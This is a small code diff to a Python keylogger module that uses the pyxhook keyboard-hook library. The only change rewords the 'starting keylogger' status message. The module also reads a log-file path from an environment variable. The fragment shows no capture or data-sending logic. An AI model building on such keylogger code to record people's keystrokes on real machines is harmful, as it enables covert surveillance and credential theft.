@@ -4,7 +4,7 @@ import pyxhook
 from rich import print as rprint
 
 def run(**args):
-    rprint("[ :warning: ] starting keylogger.")
+    rprint("[*] starting keylogger.")
     
     log_file = os.environ.get(
         'pylogger_file',
